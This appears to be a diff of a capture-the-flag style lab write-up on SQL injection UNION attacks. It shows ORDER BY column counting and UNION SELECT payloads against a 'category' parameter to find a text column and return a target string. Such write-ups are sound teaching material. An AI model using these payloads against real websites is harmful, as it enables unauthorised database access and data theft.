@@ -1,30 +1,40 @@
 
-### SQL injection UNION attack, determining the number of columns returned by the query : PRACTITIONER
+### SQL injection UNION attack, finding a column containing text : PRACTITIONER
 
 ---
 
-> Open different categories and see that there is a category parameter.
+Since the `category` query parameter is vulnerable to SQLi, we inject all our payloads there.
 
-![](./screenshots/lab1-1.png)
+![](./screenshots/4-1.png)
 
-> We know that it is vulnerable to UNION based injection, but we need to figure out the number of columns that are in the original query, to do that, we use the adding `NULL` technique.
-
-> Try the exploit by adding it to the query parameter `category` that is vulnerable to SQLi.
+Get the number of columns using the `order by` technique. Keep increasing order by index until an error is produced.
 ```
-Accessories' UNION SELECT NULL --
+Accessories' ORDER BY 4--
 ```
+- Number of columns is 3 since we got the error at 4.
 
-![](./screenshots/lab4-1.png)
-
-> Doenst work, so keep adding `NULL,` until it clicks.
-> Works at 3 `NULL` added, so there are 3 columns in the query.
+Since we want to make the database retrieve a string, we need to find the column that returns a string.
+- We can do that by using the following query, and trying to place a string instead of each `NULL`.
 
 ```
-Accessories' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT 'a', NULL, NULL --
+' UNION SELECT NULL, 'a', NULL --
+' UNION SELECT NULL, NULL, 'a' --
 ```
 
-![](./screenshots/lab4-2.png)
+The second column is of type string as the website returns a response that isn't an error. The payload used:
+```
+' UNION SELECT NULL, 'a', NULL --
+```
 
-> We see an extra row of null values, meaning that our UNION attack works, as the other query we appended to the original one returns NULL data.
+> Now we know which column is text. We need to retrieve the value `15z7Rc` from the database.
+
+So we modify the above query to be:
+```
+' UNION SELECT NULL, '15z7Rc', NULL --
+```
+
+An extra row is output with the wanted data.
 
 ---
